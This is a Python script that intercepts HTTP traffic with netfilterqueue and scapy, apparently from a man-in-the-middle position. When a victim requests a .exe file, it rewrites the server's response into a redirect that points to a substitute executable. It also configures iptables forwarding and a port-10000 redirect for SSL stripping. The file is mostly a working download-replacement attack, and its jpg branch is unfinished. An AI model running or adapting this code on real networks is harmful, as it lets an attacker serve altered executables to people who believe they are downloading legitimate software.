#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse

exe_ack_list = []
jpg_ack_list = []
destport = 80
srcport = 80

# add command line arguments to choose file type to replace, maybe name of file to replace?

def get_arguments():
    parser = argparse.ArgumentParser()
    # parser.add_argument("-u", "--url", dest="url", help="URL to Spoof")
    # parser.add_argument("-w", "--webserver", dest="webserver", help="New webserver ip")
    parser.add_argument("-d", "--debug", dest="debug", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("-ssl", "--ssl", dest="ssl", action="store_true", help=argparse.SUPPRESS)
    options = parser.parse_args()
    # if not options.url:
    #     # handle error
    #     parser.error("[-] Please specify a url to spoof, use --help for more info")
    # if not options.webserver:
    #     # handle error
    #     parser.error("[-] Please specify a new webserver [X.X.X.X] , use --help for more info")
    return options

def set_load(packet,load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # options = get_arguments()
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
        # print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == destport:
            print("Request")
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.15" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                exe_ack_list.append(scapy_packet[scapy.TCP].ack)
            elif ".jpg" in scapy_packet[scapy.Raw].load:
                print("[+] jpg Request")
                jpg_ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == srcport:
            print("Response")
            if scapy_packet[scapy.TCP].seq in exe_ack_list:
                exe_ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file with exe")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.7-zip.org/a/7z1900.exe\n\n")
                
                packet.set_payload(str(modified_packet))
            elif scapy_packet[scapy.TCP].seq in jpg_ack_list:
                jpg_ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file with jpg")

    packet.accept()

def set_iptables(options):
    if options.debug or options.ssl:
        if options.ssl:
            subprocess.call(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"])
        subprocess.call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num","0"])
        subprocess.call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num","0"])
    else:
        subprocess.call(["iptables","-I","FORWARD","-j","NFQUEUE","--queue-num","0"])

options = get_arguments()
if options.ssl:
    destport = 10000
    srcport = 10000
set_iptables(options)
print("[+] Setting up iptables...")
print("[+] Done.")
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    # clear queue
    print("[+] Flushing iptables")
    subprocess.call(["iptables","--flush"])
    print("[+] Done.")